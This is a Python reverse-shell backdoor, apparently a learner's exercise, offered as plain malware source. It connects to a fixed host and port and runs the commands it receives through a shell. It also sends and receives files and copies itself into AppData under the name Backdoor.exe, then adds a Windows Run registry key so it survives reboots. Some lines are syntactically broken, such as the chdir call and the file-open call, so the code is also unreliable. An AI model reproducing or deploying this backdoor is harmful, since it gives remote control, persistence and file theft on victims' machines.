
#!/usr/bin/python
import socket
import json
import subprocess
import time
import sys
import os
import shutil
import base64

#This fun. allows us to recieve large bytes of data
def relaible_recv():
	global json_data 
	json_data=""
	while True:
		try:
			json_data=json_data + str(sock.recv(1024))
			return json.loads(json_data)
		except ValueError:
			continue

#This fun. allows us to send large bytes of data      
def relaible_send(data):
	json.dumps(data)
	sock.send(json_data)

#This fun. allows us to recieve commands for execution 
def shell():
	while True:
		command=relaible_recv()
		if command=='q':
			break
			
		elif command[:2]=='cd' and len(command)>1:
			try:
				os.chdir([:3])
			except:
				continue

		elif command[:8]=='download':
			with file.open(command[9:],'rb') as file:
				try:
					relaible_send(base64.b64encode(file.read()))
				except:
					failed="File not found "
					relaible_send(base64.b64encode(failed))

		elif command[:6]=='upload':
			with open(command[7:],'wb') as file:
				result=relaible_recv()
				file.write(base64.b64decode(result))


		else:
			try:
				proc=subprocess.Popen(command,shell=True,stdout=subprocess.PIPE,stderr=subprocess.PIPE,stdin=subprocess.PIPE)
				result=proc.stdout.read()+proc.stderr.read()
				relaible_send(result)

			except:
				relaible_send("[!!]Can't execute the command: "+command)


#This fun. allows us to connect to the server 
def connection():
	while True:
		time.sleep(30)
		try:
			sock.connect(("192.168.1.9",54321))
			shell()
		except:
			connection()
		
location=os.environ["appdata"]+"\\Backdoor.exe"
if not os.path.exists(location):
	shutil.copyfile(sys.executable,location)
	subprocess.call('reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v reverse_shell /t REG_SZ /d"'+location+'"', shell=True)

sock=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
connection()
sock.close()
